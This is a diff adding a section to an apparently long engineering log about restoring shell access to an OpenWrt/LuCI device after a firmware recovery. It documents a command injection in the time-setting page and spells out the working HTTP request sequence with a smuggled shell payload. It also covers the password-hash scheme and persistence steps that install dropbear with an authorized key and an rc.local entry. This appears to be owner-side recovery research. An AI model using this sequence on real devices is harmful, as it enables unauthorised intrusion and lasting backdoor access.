@@ -12959,3 +12959,53 @@ contract is checkable by grep instead of by hope.
 **DECISION RULE IT FEEDS:**
     owrt volume present AND mounts AND soft-float  -> skip step 4 entirely; go to the kernel write
     absent / will not mount / wrong ABI            -> route A (recorded, proven) then re-check
+
+
+## PHASE 132 (2026-10-12): THE SHELL-RESTORE STEP VERIFIED AT THE BYTECODE LEVEL
+
+The shell-restore is the plan's single point of failure (the post-recovery box has no ssh, and no other
+route is recorded). I verified it against the actual 2.4.15 image rather than trusting the recipe.
+
+### THE SINK EXISTS, TWICE, IN THE SERVED IMAGE
+
+`rootfs-2.4.15/squashfs-root/usr/lib/lua/luci/model/cbi/system/systime.lua` (3,812 B, LuaQ bytecode)
+contains two `luci.util.call("date -s ...")` sites, both fed from
+`luci.http.formvalue("timeclock")`:
+
+    date -s '%04d-%02d-%02d %02d:%02d:%02d'   with year/month/hour/...  <- the typed path
+    date -s '%s'                              <- RAW, the posted value straight into the shell
+    fork_exec("env -i ACTION='setclock' /sbin/hotplug-call ntp")
+
+**The second passes the posted value unmodified into a shell command** - that is the injection, and it is
+present in the image the recovery door serves.
+
+### THE EXACT WORKING CALL (from the PHASE 109 run that succeeded)
+
+    GET  /cgi-bin/luci/admin/wizard        -> 403 + the form (_csrf, salt; NO token field)
+    POST /cgi-bin/luci/admin/wizard        -> 302 + Set-Cookie: sysauth=...    (persist the jar)
+    GET  /cgi-bin/luci/admin/system/systime-> 200, carries the REQUIRED `token`
+    POST /cgi-bin/luci/admin/system/systime
+            token=<token>
+            cbi.submit=1
+            cbid.system.ntp.current="'; <CMD>; #"
+            timeclock=<same payload>
+    -> proven by SIDE EFFECT (a file written under /www/luci-static/ and fetched back with 200)
+
+    password hash for this build : sha256(sha256(plaintext + salt))   (no `token` at login time)
+
+### AND THE DAEMON STEP, WHICH IS THE PART THAT ACTUALLY STICKS
+
+    dropbearkey -t rsa     -f /etc/dropbear/dropbear_rsa_host_key       (both keys ship 0 bytes)
+    dropbearkey -t ed25519 -f /etc/dropbear/dropbear_ed25519_host_key
+    project key -> BOTH /root/.ssh/authorized_keys AND /etc/dropbear/authorized_keys (0600)
+    /sbin/start-stop-daemon -S -x /usr/sbin/dropbear -- -p 22 -R        (a plain background start dies)
+    /etc/rc.local: insert the dropbear line BEFORE `exit 0`             (after is a silent no-op)
+
+**All of those binaries are confirmed present in the stock rootfs (PHASE 130).**
+
+### WHY THIS MATTERS
+
+The recovery returns the box with no shell and the vendor UI refuses custom images on the RSA gate, so
+**this route is the only way back in.** Verifying the sink exists in the served image - rather than
+assuming the recipe transfers - is what makes the post-reset window predictable. If the sink were
+patched, the plan would need a different door and I would want to know that NOW, not at the bench.
